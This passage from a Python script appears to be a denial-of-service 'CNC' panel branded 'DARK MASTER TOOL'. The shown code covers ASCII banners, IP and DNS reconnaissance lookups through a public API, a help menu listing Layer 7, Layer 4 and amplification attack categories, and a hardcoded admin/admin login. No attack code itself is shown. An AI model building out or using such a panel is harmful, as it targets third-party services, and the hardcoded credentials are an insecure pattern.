            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  \033[0m')
            print('\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  \033[0m')
                
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: GEOIP <IP>\033[0m')
                print('\033[92mEXAMPLE: GEOIP 1.1.1.1\033[0m')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: REVERSEIP <IP>\033[0m')
                print('\033[92mEXAMPLE: REVERSEIP 1.1.1.1\033[0m')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: SUBNET-LOOKUP <CDR/IP + NETMASK>\033[0m')
                print('\033[92mEXAMPLE: SUBNET-LOOKUP 192.168.1.0/24\033[0m')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: ASN-LOOKUP <IP/ASN>\033[0m')
                print('\033[92mEXAMPLE: ASN-LOOKUP AS15169\033[0m')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: DNS-LOOKUP <DNS>\033[0m')
                print('\033[92mEXAMPLE: DNS-LOOKUP google.com\033[0m')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print('\033[92m' + r.text + '\033[0m')
                except:
                    print("\033[91m[ API ERROR :( ]\033[0m")
            except IndexError:
                print('\033[92mUSAGE: REVERSE-DNS <IP/DOMAIN>\033[0m')
                print('\033[92mEXAMPLE: REVERSE-DNS 8.8.8.8\033[0m')                

        elif "cloudflare-lag" in cnc:
            print('\033[91mMETHOD "CLOUDFLARE-LAG" NOT ENABLED\033[0m')

        elif "help" in cnc:
            print(f'''
\033[91mLAYER7  \033[92m> SHOW LAYER7 METHODS\033[0m
\033[91mLAYER4  \033[92m> SHOW LAYER4 METHODS\033[0m
\033[91mAMP     \033[92m> SHOW AMP METHODS\033[0m
\033[91mSPECIAL \033[92m> SHOW SPECIAL METHODS\033[0m
\033[91mBANNERS \033[92m> SHOW BANNERS\033[0m
\033[91mRULES   \033[92m> RULES PANEL\033[0m
\033[91mPORTS   \033[92m> SHOW ALL PORTS\033[0m
\033[91mTOOLS   \033[92m> SHOW TOOLS\033[0m
\033[91mCLEAR   \033[92m> CLEAR TERMINAL\033[0m
            ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print(f"\033[91mCOMMAND: [ {cmmnd} ] NOT FOUND!\033[0m")
            except IndexError:
                pass


def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("\033[91m[*] USERNAME: \033[0m")
    password = getpass.getpass(prompt='\033[91m[*] PASSWORD: \033[0m')
    if username != user or password != passwd:
        print("")
        print("\033[91m[*] HAIZZZ, YOU'RE SO CUTE...\033[0m")
        sys.exit(1)
    elif username == user and password == passwd:
        print("\033[92m[*] WELCOME TO DARK MASTER TOOL\033[0m")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
